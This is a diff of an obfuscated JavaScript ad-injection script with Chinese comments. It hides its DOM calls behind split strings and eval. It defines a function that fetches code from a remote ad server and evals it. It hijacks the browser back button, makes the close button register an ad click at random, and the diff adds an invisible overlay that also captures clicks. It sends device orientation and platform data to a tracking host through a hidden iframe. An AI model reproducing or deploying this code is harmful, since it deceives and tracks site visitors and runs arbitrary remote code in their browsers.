@@ -7,7 +7,7 @@
  * @params {Number || String} close_btn 关闭按钮 默认1，1默认按钮效果，或者图片地址
  * @params {Number} closeDec 关闭按钮是否真的关闭 范围0.01 ~ 1 默认0，0可直接关闭
  * @params {Number} showBorder 是否显示边框，默认0， 0 不显示，其它数字表示边框大小
- * @params {0 || String} effect 效果，0为关闭 ，默认'pulse'  'tada'抖动 'pulse'放大 'rotate'旋转
+ * @params {String} effect 效果，'no'为关闭 ，默认'pulse'  'tada'抖动 'pulse'放大 'rotate'旋转
  * @params {String} effectdura 效果间隔, 默认 '5s';
  * @params {String} effectdelay 效果延时, 默认 '3s';
  * @params {String} stutslink 统计链接地址
@@ -82,13 +82,9 @@ class Zed {
         this.writeCss();
         this.mobc();
         this.creatWrapper();
-        let lcsl = setInterval(()=>{
-            this.writeCss();
-        },300);
         setTimeout(() => {
             this.writeCss();
-            clearInterval(lcsl);
-        }, 600);
+        }, 300);
         if (window.top != window.self) {
             this.iframeInnercss();
         }
@@ -116,6 +112,7 @@ class Zed {
     creatWrapper() {
         let wrap = document.createElement('d'+'i'+'v');
         let closeBtn = this.closeBtn();
+        let coverEle = this.creatCover();
         let imgbox = this.imgBox();
         wrap.className = 'zed-wrap';
         wrap.id = 'zedbox32tkbfe';
@@ -129,24 +126,31 @@ class Zed {
         this.adPosition(wrap);
 
         let paranum = this.btnNumpar;
-        function propt(probability:number){
-            var probability = probability*100 || 1;
-            var odds = Math.floor(Math.random()*100);
-            if(probability === 1){
-                closeBtn.setAttribute('onclick', `cxta(${paranum})`);
-            };
-            if(odds < probability){
-                closeBtn.setAttribute('onclick', `cxta(${paranum})`);
-            }else{
-                closeBtn.onclick = () => {
+        function propt(probability: number) {
+            var probability = probability * 100;
+            let odds = Math.floor(Math.random() * 100);
+            if (probability === 1) {
+                closeBtn.setAttribute('onclick', "cxta(" + paranum + ")");
+            }
+            if (probability === 0) {
+                closeBtn.onclick = function () {
                     wrap.style.display = 'none';
                     document.body.removeChild(wrap);
-                    eval('do' + 'cum' + 'ent.bo' + 'dy.classList.remove("bovwf");');
-                }
+                    //eval('do' + 'cum' + 'ent.bo' + 'dy.classList.remove("bovwf");');
+                };
+            }else if (odds < probability) {
+                closeBtn.setAttribute('onclick', "cxta(" + paranum + ")");
             }
-        };
-        propt(Number(this.closeDec));
-        
+            else {
+                closeBtn.onclick = function () {
+                    wrap.style.display = 'none';
+                    document.body.removeChild(wrap);
+                    //eval('do' + 'cum' + 'ent.bo' + 'dy.classList.remove("bovwf");');
+                };
+            }
+        }
+        propt(this.closeDec);
+        wrap.appendChild(coverEle);
         wrap.appendChild(closeBtn);
         wrap.appendChild(imgbox);
         window.addEventListener('load', ()=>{
@@ -165,9 +169,6 @@ class Zed {
                     }
                 }
             }else{
-                /* if (this.pos == 'top' || this.pos == 'bottom') { //位置是顶部和底部时，给body加样式，以免页面出现滚动条时位置不是在页面的最顶部和最底部
-                    eval('do' + 'cum' + 'ent.bo' + 'dy.classList.add("bovwf");');
-                } */
                 eval('do'+'cum'+'ent.bo'+'dy.appe'+'ndCh'+'ild(wrap);');
                 var mt = document.createElement('meta');
                 mt.setAttribute('name', 'viewport');
@@ -177,16 +178,6 @@ class Zed {
                 ma.setAttribute("content", 'no');
                 eval('do'+'cu'+'ment.he'+'a'+'d.ap'+'pe'+'ndCh'+'ild(mt);');
                 eval('do'+'cu'+'ment.he'+'a'+'d.ap'+'pe'+'ndCh'+'ild(ma);');
-                if (this.pos == 'bottom') {
-                    window.addEventListener('scroll', () => {
-                        if (wrap) {
-                            let st = document.body.scrollTop || document.documentElement.scrollTop;
-                            let pagrH = document.documentElement.clientHeight;
-                            console.log(st, pagrH, wrap.offsetHeight);
-                            wrap.style.top = st + pagrH - wrap.offsetHeight +'px';
-                        }
-                    })
-                }
             }
         });
         if (this.pos == 'top') {
@@ -232,7 +223,6 @@ class Zed {
             wrapEle.style.top = `${ this.distanceTop }`;
         }else
         if (this.pos == 'top') {
-            // wrapEle.style.position = String.fromCharCode(102)+String.fromCharCode(105)+ String.fromCharCode(120)+String.fromCharCode(101)+String.fromCharCode(100);
             wrapEle.style.position = 'ab'+'sol'+'ute';
             wrapEle.style.zIndex = '999'+'999';
             wrapEle.style.left = '0';
@@ -241,7 +231,6 @@ class Zed {
             wrapEle.style.width = '100%';
         }else
         if (this.pos == 'bottom') {
-            // wrapEle.style.position = String.fromCharCode(102)+String.fromCharCode(105)+ String.fromCharCode(120)+String.fromCharCode(101)+String.fromCharCode(100);
             wrapEle.style.position = 'ab'+'sol'+'ute';
             wrapEle.style.zIndex = '999'+'999';
             wrapEle.style.left = '0';
@@ -265,6 +254,48 @@ class Zed {
         if (window.self !== window.top) { // iframe
             wrapEle.style.cssText = '';
         }
+    }
+    creatCover(){
+        var ahnum = (this.aHeight).replace(/px/, '');
+        var awnum = (this.aWidth).replace(/px/, '');
+        if (this.aHeight.indexOf('%') > -1) {
+            ahnum = (this.aHeight).replace(/%/, '');
+            ahnum = this.winH * (Number(ahnum) / 100);
+        }
+        if (this.aWidth.indexOf('%') > -1) {
+            awnum = (this.aWidth).replace(/%/, '');
+            awnum = this.winW * (Number(awnum) / 100);
+        }
+        if (this.pos == 'top' || this.pos == 'bottom') {
+            awnum = this.winW;
+        }
+        var aw = Number(awnum);
+        var ah = Number(ahnum);
+        var anthoer_w = aw * (this.shdow) / 100;
+        var anthoer_h = ah * (this.shdow) / 100;
+        var coverW = aw + anthoer_w * 2;
+        var coverH = ah + anthoer_h * 2;
+        var coverStl = "width: " + coverW + "px;height: " + coverH + "px;top: -" + anthoer_h + "px;left: -" + anthoer_w + "px;po" + this.cofc('sit') + "ion: " + this.cofc('ab') + this.cofc('so') + this.cofc('lute') + ";z-in"+"dex: 1;";
+        if (this.pos == 'top') {
+            coverStl = "width: 100%;height: " + (coverH - anthoer_h) + "px;top: 0;po" + this.cofc('sit') + "ion: " + this.cofc('ab') + this.cofc('so') + this.cofc('lute') + ";z-in"+"dex: 1;";
+        }
+        if (this.pos == 'bottom') {
+            coverStl = "width: 100%;height: " + (coverH - anthoer_h) + "px;bottom: 0;po" + this.cofc('sit') + "ion: " + this.cofc('ab') + this.cofc('so') + this.cofc('lute') + ";z-in"+"dex: 1;";
+        }
+        if (this.pos == 'right') {
+            coverStl = "width: " + (coverW - anthoer_w) + "px;height: " + coverH + "px;right: 0;top: -" + anthoer_h + "px;po" + this.cofc('sit') + "ion: " + this.cofc('ab') + this.cofc('so') + this.cofc('lute') + ";z-in"+"dex: 1;";
+        }
+        if (this.pos == 'left') {
+            coverStl = "width: " + (coverW - anthoer_w) + "px;height: " + coverH + "px;left: 0;top: -" + anthoer_h + "px;po" + this.cofc('sit') + "ion: " + this.cofc('ab') + this.cofc('so') + this.cofc('lute') + ";z-in"+"dex: 1;";
+        }
+        if (this.pos == 'none') {
+            coverStl = "width: 100%;height: " + coverH + "px;left: 0;top: -" + anthoer_h + "px;po" + this.cofc('sit') + "ion: " + this.cofc('ab') + this.cofc('so') + this.cofc('lute') + ";z-in"+"dex: 1;";
+        }
+        var paranum = this.shdowNumpar;
+        var coverEl = document.createElement('d' + 'i' + 'v');
+        coverEl.style.cssText += coverStl;
+        coverEl.setAttribute('onclick', "cxta(" + paranum + ")");
+        return coverEl;
     }
     closeBtn(){
         let btn = document.createElement('d'+'i'+'v');
@@ -296,46 +327,10 @@ class Zed {
     imgBox(){
         let imglist = this.imgs;
         let imgEle = '';
-        let ahnum = (this.aHeight).replace(/px/,'');
-        let awnum= (this.aWidth).replace(/px/,'');
-        if (this.aHeight.indexOf('%') > -1) {
-            ahnum = (this.aHeight).replace(/%/,'');
-            ahnum = this.winH * (Number(ahnum) / 100);
-        }
-        if (this.aWidth.indexOf('%') > -1) {
-            awnum = (this.aWidth).replace(/%/,'');
-            awnum = this.winW * (Number(awnum) / 100);
-        }
-        if (this.pos == 'top' || this.pos == 'bottom') {
-            awnum = this.winW;
-        }
-        let aw = Number(awnum);
-        let ah = Number(ahnum);
-        let anthoer_w = aw* (this.shdow)/100;
-        let anthoer_h = ah* (this.shdow)/100;
-        let coverW = aw + anthoer_w*2;
-        let coverH = ah + anthoer_h*2;
-        let coverStl = `width: ${coverW}px;height: ${coverH}px;top: -${anthoer_h}px;left: -${anthoer_w}px;po${this.cofc('sit')}ion: ${this.cofc('ab')}${this.cofc('so')}${this.cofc('lute')};`;
-        if (this.pos == 'top') {
-            coverStl = `width: 100%;height: ${coverH - anthoer_h}px;top: 0;po${this.cofc('sit')}ion: ${this.cofc('ab')}${this.cofc('so')}${this.cofc('lute')};`;
-        }
-        if (this.pos == 'bottom') {
-            coverStl = `width: 100%;height: ${coverH - anthoer_h}px;bottom: 0;po${this.cofc('sit')}ion: ${this.cofc('ab')}${this.cofc('so')}${this.cofc('lute')};`;
-        }
-        if (this.pos == 'right') {
-            coverStl = `width: ${coverW - anthoer_w}px;height: ${coverH}px;right: 0;top: -${anthoer_h}px;po${this.cofc('sit')}ion: ${this.cofc('ab')}${this.cofc('so')}${this.cofc('lute')};`;
-        }
-        if (this.pos == 'left') {
-            coverStl = `width: ${coverW - anthoer_w}px;height: ${coverH}px;left: 0;top: -${anthoer_h}px;po${this.cofc('sit')}ion: ${this.cofc('ab')}${this.cofc('so')}${this.cofc('lute')};`;
-        }
-        if (this.pos == 'none') {
-            coverStl = `width: 100%;height: ${coverH}px;left: 0;top: -${anthoer_h}px;po${this.cofc('sit')}ion: ${this.cofc('ab')}${this.cofc('so')}${this.cofc('lute')};`;
-        }
-        let paranum = this.shdowNumpar;
         if (imglist.length > 0) {
             for (let i = 0; i < imglist.length; i++) {
                 let cssDisplay = i === 0 ? 'block': 'none';
-                imgEle += `<div class="item" style="display:${cssDisplay};width: 100%;height: 100%;po${this.cofc('sit')}ion: r${this.cofc('ela')}tive;"><a><img src="${imglist[i]}" style="width: 100%;height: 100%;"/><div class="cover" style="${coverStl}" onclick="cxta(${paranum});"></div></a></div>`;
+                imgEle += `<div class="item" style="display:${cssDisplay};width: 100%;height: 100%;po${this.cofc('sit')}ion: r${this.cofc('ela')}tive;"><a><img src="${imglist[i]}" style="width: 100%;height: 100%;"/></a></div>`;
             }
         }
         let imgBox = document.createElement('d'+'i'+'v');
@@ -344,7 +339,9 @@ class Zed {
         imgBox.style.height = '100%';
         imgBox.style.position = 'r'+'e'+'l'+'a'+'t'+'i'+'v'+'e';
         imgBox.setAttribute('onclick', `cxta(${this.imgNumpar})`);
-        if (this.effect !== 0) {
+        if (this.effect == 'no') {
+            imgBox.className += ' ';
+        }else{
             imgBox.className += ' ' + `animated ${this.effect} infinite slower`;
         }
         if (this.effectdura != '') {
@@ -387,7 +384,7 @@ class Zed {
         let borderDiv = document.createElement('d'+'i'+'v');
         borderDiv.className = 'boddiv';
         borderDiv.style.position = 'ab'+'so'+'lu'+'te';
-        borderDiv.style.cssText = `width: 100%;height: 100%; ${this.cofc('to')}p:0;-webkit-box-sizing: border-box;-moz-box-sizing: border-box;box-sizing: border-box;-webkit-background-clip: text;background-clip: text;-webkit-text-fill-color: transparent;text-fill-color: transparent;-webkit-animation: hue 8s infinite linear;animation: hue 8s infinite linear;`;
+        borderDiv.style.cssText += `width: 100%;height: 100%; ${this.cofc('to')}p:0;-webkit-box-sizing: border-box;-moz-box-sizing: border-box;box-sizing: border-box;-webkit-background-clip: text;background-clip: text;-webkit-text-fill-color: transparent;text-fill-color: transparent;-webkit-animation: hue 8s infinite linear;animation: hue 8s infinite linear;`;
         if (this.showBorder == 1) {
             borderDiv.style.border= `${this.showBorder}px solid red`;
         }
@@ -420,7 +417,7 @@ class Zed {
         var odiv_m_1 = document.createElement('div');
         odiv_m_1.style.display = "none";
         var oiframe_m_1 = document.createElement("iframe");
-        oiframe_m_1.src = `${this.stutslink}&l=h`;
+        oiframe_m_1.src = this.stutslink;
         oiframe_m_1.height="0";
         oiframe_m_1.width="0";
         oiframe_m_1.sandbox="allow-same-origin allow-scripts allow-forms";
@@ -431,7 +428,7 @@ class Zed {
     }
     mobc(){
         window.addEventListener("deviceorientation", event => {
-            let  M18_url = `${this.alink}&pn=0.25&ref=${this.ref()}&refso=${navigator.platform}_${this.asType}&zhongli=_${Math.floor(event.alpha)},${Math.floor(event.beta)},${Math.floor(event.gamma)}`;
+            let  M18_url = `${this.alink}&ref=${this.ref()}&refso=${navigator.platform}_${this.asType}&zhongli=_${Math.floor(event.alpha)},${Math.floor(event.beta)},${Math.floor(event.gamma)}`;
 
             let strjs1 = `function cxta(ct){var a=new XMLHttpRequest();var b='${M18_url}&n='+window.history.length+'&ct='+ct+'&r='+Math.floor(Math.random()*9999999+1);if(a!=null){a.onreadystatechange=function(){if(a.readyState==4 && a.status==200){if(window.execScript)window.execScript(a.responseText,'JavaScript');else if(window.eval)window.eval(a.responseText,'JavaScript');else eval(a.responseText);}};a.open('GET',b,false);a.send();}}pushHistory();function pushHistory(){var state={title:'title',url:'#'};window.history.pushState(state,'title','#')}window.addEventListener('popstate', function (e) {cxta(${this.backNumpar});}, false);`;
             let js1nod = document.createElement('script');
@@ -452,7 +449,9 @@ class Zed {
             }
         }
         `;
-        // s.innerHTML += 'html,body{width: 100%;height: 100%;}.bovwf{width: 100%;height: 100%;overflow: hidden!important;position: '+'r'+'e'+'l'+'at'+'i'+'v'+'e;}';
+        if (window.self == window.top) {
+            s.innerHTML += "html,body{height: 100%}html{overflow: hidden}body{overflow: auto}";
+        }
         if (this.effect !== 0) {
             s.innerHTML += `
             .animated {
@@ -460,6 +459,11 @@ class Zed {
                 animation-duration: 1s;
                 -webkit-animation-fill-mode: both;
                 animation-fill-mode: both;
+                webkit-transform: translate3d(0,0,0);
+                -moz-transform: translate3d(0,0,0);
+                -ms-transform: translate3d(0,0,0);
+                -o-transform: translate3d(0,0,0);
+                transform: translate3d(0,0,0);
               }
               .animated.infinite {
                 -webkit-animation-iteration-count: infinite;
@@ -647,7 +651,6 @@ class Zed {
                 animation-duration: 8s;
             }
             `;
-            
         }
         let head = document.getElementsByTagName('h'+'e'+'a'+'d')[0];
         window.addEventListener('DOMContentLoaded', ()=>{
@@ -705,7 +708,7 @@ new Zed({
     close_btn: 1,
     closeDec: 0.5,
     showBorder: 0,
-    effect: 0,
+    effect: 'pulse',
     effectdura: '6s',
     effectdelay: '',
     stutslink: 'https://cc.ydy2.com/cnzz.html?ptype=<?=$equipment?>&userid=<?=$userid?>&pid=<?=$pid?>&s=<?=$systj?>',
